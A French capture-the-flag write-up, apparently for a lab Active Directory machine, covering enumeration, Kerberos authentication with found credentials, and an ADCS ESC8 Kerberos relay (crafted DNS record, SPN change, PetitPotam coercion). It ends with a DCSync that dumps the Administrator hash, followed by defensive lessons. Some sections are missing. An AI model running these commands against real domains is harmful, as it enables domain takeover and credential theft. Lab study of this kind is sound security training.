01

ÉNUMÉRATION

🔍

On commence par un scan Nmap complet pour identifier tous les ports ouverts et les services actifs sur la machine cible.

bash 
# Ajout des entrées DNS
echo "10.129.234.48 DC-JPQ225.cicada.vl cicada.vl" | sudo tee -a /etc/hosts

# Scan Nmap complet
nmap -sC -sV 10.129.234.48

Le scan révèle une infrastructure Active Directory typique avec plusieurs ports caractéristiques :

Port Service Notes
53 DNS Simple DNS Plus
80 HTTP ⚠ IIS — Web Enrollment ADCS possible
88 Kerberos Authentification AD
389 / 636 LDAP / LDAPS Domaine : cicada.vl
445 SMB Signing activé — NTLM désactivé
2049 NFS ⚠ Partage public accessible

Points clés : Le port 2049 (NFS) est ouvert — un partage accessible à tous. Le port 80 suggère un Web Enrollment ADCS. NTLM est désactivé, donc toute authentification devra passer par Kerberos.

📂

Le service NFS expose un partage /profiles accessible par tout le monde. Ce partage semble correspondre au répertoire C:\Users du serveur Windows.

# Monter le partage

03

AUTHENTIFICATION KERBEROS

🔐

NTLM étant désactivé sur cette machine, il faut synchroniser l'horloge locale avec celle du DC (Kerberos est très sensible au décalage d'horloge, tolérance de 5 minutes maximum) puis utiliser l'authentification Kerberos avec le flag -k.

bash 
# Synchroniser l'horloge
sudo ntpdate -u 10.129.234.48

# Vérifier les credentials via Kerberos
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k
SMB  DC-JPQ225  [+] cicada.vl\Rosie.Powell:Cicada123

# Énumérer les partages SMB
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k --shares
  ADMIN$       Remote Admin
  C$           Default share
  CertEnroll   READ  ← Active Directory Certificate Services !
  IPC$         READ
  NETLOGON     READ
  profiles$    READ,WRITE
  SYSVOL       READ
Observation importante : Le partage CertEnroll confirme qu'ADCS (Active Directory Certificate Services) est installé sur ce DC. C'est notre prochaine cible d'énumération.

ESC8 — HTTP Web Enrollment

ESC8 est une vulnérabilité ADCS où le Web Enrollment (interface HTTP permettant de demander des certificats) est accessible via HTTP non sécurisé. Cela permet à un attaquant de relayer une authentification interceptée vers ce endpoint et d'obtenir un certificat au nom de la victime — même un compte machine DC.

On confirme également les méthodes de coercition disponibles :

bash 
netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus

05

KERBEROS RELAY — ESC8

⚡
Pourquoi Kerberos relay et pas NTLM relay ?
NTLM est complètement désactivé sur ce DC. Le self-relay NTLM est aussi bloqué nativement par Windows. On doit donc utiliser le Kerberos relay via krbrelayx — qui n'est pas soumis à ces restrictions.

La technique repose sur un enregistrement DNS spécial dont le nom contient une structure CREDENTIAL_TARGET_INFORMATION sérialisée. Quand le DC voit ce nom, il génère automatiquement un ticket Kerberos pour son propre compte machine DC-JPQ225$.

Étape 1 — DNS Record Magique
Ajouter un enregistrement DNS pointant vers notre machine avec un nom contenant la structure CREDENTIAL_TARGET_INFORMATION
Étape 2 — SPN via BloodyAD
Ajouter un SPN pour forcer le DC à générer un ticket Kerberos pour son compte machine
Étape 3 — Lancer Krbrelayx
Écouter sur le port 445 et relayer automatiquement les tickets Kerberos reçus vers ADCS HTTP
Étape 4 — Coercition PetitPotam
Forcer le DC à se connecter vers notre enregistrement DNS malveillant
Résultat — Certificat DC-JPQ225$
ADCS émet un certificat valide pour le compte machine du DC
bash — Étape 1 : DNS Record 
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k \
  --host DC-JPQ225.cicada.vl add dnsRecord \
  DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA \
  10.10.14.252
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
bash — Étape 2 : SPN 
bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k \
  --host DC-JPQ225.cicada.vl set object DC-JPQ225$ \
  servicePrincipalName -v "cifs/DC-JPQ225a.cicada.vl"

DCSYNC — HASH ADMINISTRATOR

💀

Le compte machine DC-JPQ225$ possède les droits de réplication de l'annuaire (DCSync). On utilise le TGT récupéré pour extraire le hash NTLM de l'Administrator via secretsdump.

bash 
KRB5CCNAME=dc-jpq225.ccache impacket-secretsdump \
  -k -no-pass cicada.vl/dc-jpq225\$@DC-JPQ225.cicada.vl \
  -just-dc-user administrator

LESSONS LEARNED
09

CE QU'ON A APPRIS

📚
📂
NFS mal sécurisé
Un partage NFS accessible à tous exposant les profils utilisateurs peut contenir des informations sensibles comme des mots de passe dans des fichiers ou images.
📜
ESC8 — Web Enrollment HTTP
Le Web Enrollment ADCS sur HTTP permet le relayage d'authentification vers le serveur de certificats. Toujours désactiver HTTP et n'utiliser que HTTPS avec protection HTTPS binding.
⚡
Kerberos Relay
Désactiver NTLM ne suffit pas à protéger contre le relay. Kerberos peut également être relayé dans certaines conditions, notamment via des enregistrements DNS contenant des structures CREDENTIAL_TARGET_INFORMATION.
🔧
Certipy v5 vs v4
Certipy v5 contient un bug avec le Kerberos relay (identité vide). Il faut utiliser krbrelayx de dirkjanm ou certipy v4.8.2 dans un environnement Python 3.11.
🎯
DCSync via compte machine
Le compte machine du DC possède les droits de réplication. Un certificat valide pour DC-JPQ225$ permet d'obtenir un TGT et d'effectuer un DCSync pour extraire tous les hashes du domaine.
🕐
Synchronisation Kerberos
Kerberos exige une synchronisation d'horloge précise (±5 minutes). Sans ntpdate, toutes les authentifications échouent avec KRB_AP_ERR_SKEW.
